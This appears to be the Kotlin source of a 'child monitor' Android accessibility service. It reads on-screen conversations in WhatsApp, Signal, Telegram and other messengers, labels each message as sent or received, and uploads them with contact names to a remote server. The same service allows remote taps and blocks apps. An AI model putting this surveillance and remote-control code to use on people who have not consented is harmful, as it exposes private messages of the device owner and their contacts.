package com.monitor.child

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.GestureDescription
import android.graphics.Path
import android.graphics.Rect
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.cancel
import kotlinx.coroutines.launch
import java.time.Instant
import java.util.Collections

/**
 * Reads messages from the screen when a chat is open in a supported messaging app, using the
 * Accessibility API. Captures both sides of a conversation as it is viewed/scrolled — more than
 * notifications, but only what is actually on screen (not archived or unopened chats).
 *
 * For each on-screen message it also works out the *direction* from where the bubble sits: every
 * chat app draws messages you received on the left and messages you sent on the right, so a bubble
 * whose horizontal centre is past the screen midpoint is "out" (sent), otherwise "in" (received).
 * That lets the dashboard render a real left/right chat transcript grouped by conversation.
 *
 * Media (photos, voice notes, video, stickers, documents) has no readable text, so it is captured
 * as a labelled placeholder from the element's content description — the actual media is only
 * visible through the live screen view, not here.
 *
 * This is best-effort and depends on each app's on-screen layout; it may need tuning per app
 * version. Reported as `message` events with source "chat".
 */
class ChatReaderService : AccessibilityService() {

    private val scope = CoroutineScope(SupervisorJob() + Dispatchers.Default)
    private lateinit var store: Store

    // Bounded LRU of recently reported message fingerprints, to avoid re-sending the same visible
    // messages on every scroll/update.
    private val recent: MutableSet<String> = Collections.newSetFromMap(
        object : LinkedHashMap<String, Boolean>(512, 0.75f, true) {
            override fun removeEldestEntry(eldest: MutableMap.MutableEntry<String, Boolean>?): Boolean =
                size > 500
        },
    )

    /** One captured on-screen line: the display text, its side ("in"/"out"), and a dedup key. */
    private data class Line(val text: String, val direction: String, val key: String = text)

    override fun onServiceConnected() {
        super.onServiceConnected()
        store = Store(this)
        instance = this
    }

    /** Perform a tap at screen coordinates — used for remote control. */
    fun tap(x: Float, y: Float) {
        val path = Path().apply { moveTo(x, y) }
        val stroke = GestureDescription.StrokeDescription(path, 0, 50)
        dispatchGesture(GestureDescription.Builder().addStroke(stroke).build(), null, null)
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        if (event == null || !::store.isInitialized) return
        val pkg = event.packageName?.toString() ?: return
        if (pkg == packageName) return

        // App limits: if a blocked app comes to the foreground, send the user back to home.
        if (pkg in store.blockedApps) {
            performGlobalAction(GLOBAL_ACTION_HOME)
            return
        }

        if (pkg !in MESSAGING_APPS) return
        val token = store.deviceToken ?: return

        // Reading the screen tree is best-effort and touches app-specific layouts; never let a hiccup
        // here (a recycled node, an odd layout) crash the whole app process.
        try {
            val root = rootInActiveWindow ?: return
            val chatName: String?
            val lines = ArrayList<Line>()
            try {
                chatName = extractTitle(root, pkg)
                val winBounds = Rect()
                root.getBoundsInScreen(winBounds)
                val midX = if (winBounds.width() > 0) winBounds.centerX() else 540
                collectLines(root, midX, lines)
            } finally {
                try {
                    root.recycle()
                } catch (_: Throwable) {
                }
            }
            if (lines.isEmpty()) return

            val fresh = ArrayList<Line>()
            synchronized(recent) {
                for (l in lines) {
                    if (l.text == chatName || l.text.length > 1000 || UI_NOISE.matches(l.text)) continue
                    if (recent.add("$pkg|$chatName|${l.direction}|${l.key}")) fresh.add(l)
                }
            }
            if (fresh.isEmpty()) return

            lastCaptureAtMs = System.currentTimeMillis()
            val baseUrl = store.baseUrl
            scope.launch {
                val api = Api(baseUrl)
                for (l in fresh) {
                    val sender = if (l.direction == "out") "You" else chatName
                    api.postMessage(
                        token, pkg, sender, l.text, Instant.now().toString(),
                        source = "chat", direction = l.direction, conversation = chatName,
                    )
                }
            }
        } catch (_: Throwable) {
            // best-effort screen reading — swallow and wait for the next event
        }
    }

    override fun onInterrupt() {}

    override fun onDestroy() {
        if (instance === this) instance = null
        scope.cancel()
        super.onDestroy()
    }

    private fun extractTitle(root: AccessibilityNodeInfo, pkg: String): String? {
        for (id in TITLE_IDS) {
            val nodes = root.findAccessibilityNodeInfosByViewId(id) ?: continue
            var title: String? = null
            for (n in nodes) {
                if (title == null) {
                    val t = n.text?.toString()
                    if (!t.isNullOrBlank()) title = t
                }
                n.recycle()
            }
            if (title != null) return title
        }
        return null
    }

    /**
     * Walk the tree. For each leaf TextView, capture its text and which side of the screen it sits
     * on. For media elements (recognised by content description), capture a labelled placeholder.
     */
    private fun collectLines(node: AccessibilityNodeInfo?, midX: Int, out: MutableList<Line>) {
        if (node == null) return
        val cls = node.className?.toString().orEmpty()
        val isText = cls.contains("TextView", ignoreCase = true)
        val desc = node.contentDescription?.toString()?.trim()

        if (node.childCount == 0) {
            val t = node.text?.toString()?.trim()
            if (!t.isNullOrBlank() && isText) {
                out.add(Line(t, sideOf(node, midX)))
            } else if (!desc.isNullOrBlank()) {
                mediaLabel(desc)?.let { out.add(Line(it, sideOf(node, midX), key = desc)) }
            }
        } else if (!desc.isNullOrBlank() && !isText) {
            // A media bubble (image/voice container) often carries its label on a parent view.
            mediaLabel(desc)?.let { out.add(Line(it, sideOf(node, midX), key = desc)) }
        }

        for (i in 0 until node.childCount) {
            val child = node.getChild(i)
            collectLines(child, midX, out)
            child?.recycle()
        }
    }

    private fun sideOf(node: AccessibilityNodeInfo, midX: Int): String {
        val r = Rect()
        node.getBoundsInScreen(r)
        return if (r.centerX() >= midX) "out" else "in"
    }

    /** Maps a content description to a clean media placeholder, or null if it is not a media bubble. */
    private fun mediaLabel(desc: String): String? {
        val d = desc.lowercase()
        // Skip chrome that happens to contain media words (header call buttons, the contact avatar).
        if (d.contains("call") || d.contains("profile") || d.contains("avatar")) return null
        return when {
            d.contains("voice message") || d.contains("audio message") || d.contains("voice note") -> "🎤 Voice message"
            d.contains("sticker") -> "💟 Sticker"
            d.contains("gif") -> "🎬 GIF"
            d.contains("video") -> "🎥 Video"
            d.contains("photo") || d.contains("image") || d.contains("picture") -> "📷 Photo"
            d.contains("document") || d.contains("file attached") -> "📎 Document"
            else -> null
        }
    }

    companion object {
        // The running service, so ScreenService can dispatch remote taps through accessibility.
        // A non-null instance also means the accessibility service is actually bound and running
        // (Samsung can kill it while the permission still shows "on").
        @Volatile
        var instance: ChatReaderService? = null

        // When the reader last captured a chat line, so the dashboard can tell "running but quiet"
        // from "stopped".
        @Volatile
        var lastCaptureAtMs = 0L

        private val MESSAGING_APPS = setOf(
            "com.whatsapp",                // WhatsApp
            "com.whatsapp.w4b",            // WhatsApp Business
            "org.telegram.messenger",      // Telegram
            "com.facebook.orca",           // Messenger
            "com.instagram.android",       // Instagram (DMs)
            "com.snapchat.android",        // Snapchat (best-effort; the app resists capture)
            "com.zhiliaoapp.musically",    // TikTok
            "com.ss.android.ugc.trill",    // TikTok (alt region)
            "org.thoughtcrime.securesms",  // Signal
        )
        // On-screen text that is UI chrome, not a message — dropped before sending. (Plain media
        // words stay here; real media is surfaced separately via content descriptions.)
        private val UI_NOISE = Regex(
            "^(\\d{1,2}:\\d{2}(\\s?[aApP]\\.?[mM]\\.?)?|today|yesterday|monday|tuesday|wednesday|" +
                "thursday|friday|saturday|sunday|message|online|typing…|typing\\.\\.\\.|" +
                "\\d+ new messages?|checking for new messages\\.?|\\d+ messages? from \\d+ chats?|" +
                "chats|calls|updates|communities|status|reels|photo|video|voice message|gif|sticker)$",
            RegexOption.IGNORE_CASE,
        )
        // Chat title (contact/group name) view ids.
        private val TITLE_IDS = listOf(
            "com.whatsapp:id/conversation_contact_name",
            "org.telegram.messenger:id/action_bar_title",
            "com.instagram.android:id/thread_title",
            "org.thoughtcrime.securesms:id/conversation_title",
        )
    }
}
